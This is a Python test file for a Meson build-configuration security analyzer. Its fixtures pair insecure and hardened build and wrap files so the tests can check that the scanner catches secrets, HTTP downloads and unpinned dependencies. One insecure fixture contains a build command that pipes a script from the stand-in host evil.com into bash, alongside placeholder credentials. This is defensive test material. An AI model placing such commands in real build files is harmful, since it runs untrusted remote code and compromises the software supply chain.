"""Tests for MesonAnalyzer."""

from pathlib import Path

from devai.meson_analyzer import MesonAnalyzer, MesonFinding


INSECURE_MESON_BUILD = """\
project('insecure-demo', 'c', meson_version: '>=0.59.0')

api_token = 'hardcoded-secret-token-12345'

dep = dependency('openssl', required: true)

mylib = subproject('mylib')

run_command('sh', '-c', 'curl http://evil.com/install.sh | bash', check: true)

run_command('wget', 'http://insecure.example.com/tool.tar.gz', check: true)
"""

INSECURE_WRAP = """\
[wrap-git]
directory = mylib
url = https://user:pass@github.com/private/deps.git
revision = head

[wrap-file]
directory = vendor-lib
source_url = http://insecure.example.com/archive.tar.gz
source_filename = archive.tar.gz
"""

HARDENED_MESON_BUILD = """\
project('secure-demo', 'c', meson_version: '>=0.59.0')

dep = dependency('openssl', required: true)

mylib = subproject('mylib')
"""

HARDENED_WRAP = """\
[wrap-git]
directory = mylib
url = https://github.com/org/mylib.git
revision = v1.2.3

[wrap-file]
directory = vendor-lib
source_url = https://example.com/archive.tar.gz
source_filename = archive.tar.gz
source_hash = sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
"""


class TestMesonAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = MesonAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_meson_build(self, tmp_path: Path):
        (tmp_path / "meson.build").write_text(HARDENED_MESON_BUILD, encoding="utf-8")
        analyzer = MesonAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "meson.build").write_text(INSECURE_MESON_BUILD, encoding="utf-8")
        subprojects = tmp_path / "subprojects"
        subprojects.mkdir()
        (subprojects / "mylib.wrap").write_text(INSECURE_WRAP, encoding="utf-8")
        analyzer = MesonAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_wrap_revision" in kinds
        assert "wrap_download_without_hash" in kinds
        assert analyzer.health_score() < 100.0

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "meson.build").write_text(HARDENED_MESON_BUILD, encoding="utf-8")
        subprojects = tmp_path / "subprojects"
        subprojects.mkdir()
        (subprojects / "mylib.wrap").write_text(HARDENED_WRAP, encoding="utf-8")
        analyzer = MesonAnalyzer(str(tmp_path))
        assert analyzer.stats.findings == 0
        assert analyzer.health_score() == 100.0

    def test_detects_meson_options(self, tmp_path: Path):
        (tmp_path / "meson.build").write_text(
            "project('test', 'c', meson_version: '>=0.59.0')\n",
            encoding="utf-8",
        )
        (tmp_path / "meson_options.txt").write_text(
            "option('deploy_password', type: 'string', value: 'secret-123')\n",
            encoding="utf-8",
        )
        analyzer = MesonAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "meson_options.txt" for f in findings)

    def test_generate_hardened_config(self):
        analyzer = MesonAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "source_hash" in config
        assert "revision = v1.2.3" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "meson.build").write_text(INSECURE_MESON_BUILD, encoding="utf-8")
        analyzer = MesonAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Meson analysis:" in context
        assert "health score:" in context

    def test_finding_format(self):
        finding = MesonFinding(
            kind="test",
            severity="high",
            message="test message",
            path="meson.build",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert "meson.build:1" in finding.format()
